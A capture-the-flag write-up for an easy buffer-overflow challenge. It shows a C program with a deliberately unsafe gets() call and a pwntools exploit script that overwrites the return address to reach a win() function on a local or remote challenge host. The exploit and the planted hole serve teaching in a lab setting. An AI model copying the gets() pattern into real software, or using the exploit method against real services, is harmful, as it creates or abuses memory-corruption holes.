# Buffer Overflow Basic

**Category:** PWN  
**Difficulty:** Easy  
**Points:** 200  
**Author:** SPYIREX CTF Team

## Description

This program has a vulnerability. Can you exploit it?

Download: `vuln` (Linux ELF binary)  
Connect: `nc challenge.spyirex.local 1337`

## Solution

### Initial Analysis

The program takes user input without proper bounds checking, suggesting a buffer overflow vulnerability.

### Source Code (if provided)

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("cat flag.txt");
}

void vuln() {
    char buffer[64];
    gets(buffer);  // Vulnerable!
    printf("You entered: %s\n", buffer);
}

int main() {
    vuln();
    return 0;
}
```

### Approach

Overflow the buffer to overwrite the return address and redirect execution to the `win()` function.

### Steps to Solve

1. Check binary protections:
   ```bash
   checksec vuln
   ```

2. Find the `win()` function address:
   ```bash
   objdump -d vuln | grep win
   # win() at 0x08048556
   ```

3. Determine offset to return address:
   ```bash
   # Using gdb with pwndbg
   gdb vuln
   pattern create 100
   run
   # Enter the pattern
   pattern offset $eip
   # Offset: 72
   ```

4. Craft exploit:
   ```python
   from pwn import *
   
   # Local testing
   p = process('./vuln')
   # or remote
   # p = remote('challenge.spyirex.local', 1337)
   
   win_addr = p32(0x08048556)
   offset = 72
   
   payload = b'A' * offset + win_addr
   
   p.sendline(payload)
   p.interactive()
   ```

### Exploit

```python
from pwn import *

context.arch = 'i386'

# Connect
p = remote('challenge.spyirex.local', 1337)

# Addresses
win_addr = p32(0x08048556)

# Build payload
payload = b'A' * 72  # Fill buffer + saved ebp
payload += win_addr  # Overwrite return address

# Send payload
p.sendline(payload)

# Get flag
flag = p.recvall()
print(flag.decode())
```

### Flag

```
JCE{buff3r_0v3rfl0w_1s_cl4ss1c}
```

## Key Takeaways

- Buffer overflows occur when input exceeds buffer size
- `gets()` is inherently unsafe - never use it
- Return address is on the stack after saved base pointer
- Stack canaries and ASLR are modern protections
- Tools: pwntools, gdb/pwndbg, checksec, ROPgadget
- Understanding stack layout is crucial
